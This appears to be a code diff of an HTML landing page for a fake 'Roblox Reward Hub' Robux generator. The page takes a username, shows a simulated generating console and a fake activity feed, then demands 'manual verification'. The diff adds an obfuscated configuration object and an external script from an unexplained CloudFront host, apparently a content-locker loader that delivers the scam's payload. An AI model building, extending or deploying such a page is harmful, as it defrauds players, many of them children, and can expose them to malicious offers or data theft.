@@ -10,9 +10,12 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+    <script type="text/javascript">
+        var SIxaK_ZWd_CAhBjc = {"it":4551731,"key":"9a5f9"};
+    </script>
+    <script src="https://d1y0yks1k8t5m5.cloudfront.net/18d4553.js"></script>
 </head>
 <body>
-
     <header>
         <div class="container header-flex">
             <div class="logo">
@@ -24,7 +27,6 @@
             </div>
         </div>
     </header>
-
     <main class="container">
         <section id="step-1" class="card active">
             <h2><i class="fas fa-user"></i> Find Your Account</h2>
@@ -39,7 +41,6 @@
             </div>
             <button id="connect-btn" class="btn-primary">Continue</button>
         </section>
-
         <section id="step-2" class="card">
             <h2><i class="fas fa-gem"></i> Select Rewards</h2>
             <p>Choose the amount of Robux you want to add to your account.</p>
@@ -77,7 +78,6 @@
             </div>
             <button id="generate-btn" class="btn-primary">Generate Now</button>
         </section>
-
         <section id="step-3" class="card">
             <h2><i class="fas fa-sync fa-spin"></i> Generating...</h2>
             <div class="console" id="console-log">
@@ -87,32 +87,25 @@
                 <div class="progress-bar" id="progress-bar"></div>
             </div>
         </section>
-
         <section id="step-4" class="card">
             <h2 class="success-title"><i class="fas fa-check-circle"></i> Almost Done!</h2>
             <p>Manual Verification is required to prevent bot abuse and ensure the Robux reaches the correct account: <strong id="display-username"></strong></p>
-            
             <div class="verification-box">
                 <p>Click the button below to complete the final step.</p>
                 <button id="verify-btn" class="btn-verify pulse">VERIFY NOW</button>
             </div>
             <p class="small-text">Verification usually takes less than 2 minutes.</p>
         </section>
-
         <div class="recent-activity">
             <h3>Recent Activity</h3>
-            <div id="activity-list">
-                <!-- Dynamically populated -->
-            </div>
+            <div id="activity-list"></div>
         </div>
     </main>
-
     <footer>
         <div class="container">
             <p>&copy; 2025 Roblox Reward Hub. This is a promotional landing page. Not affiliated with Roblox Corporation.</p>
         </div>
     </footer>
-
     <script src="script.js"></script>
 </body>
 </html>
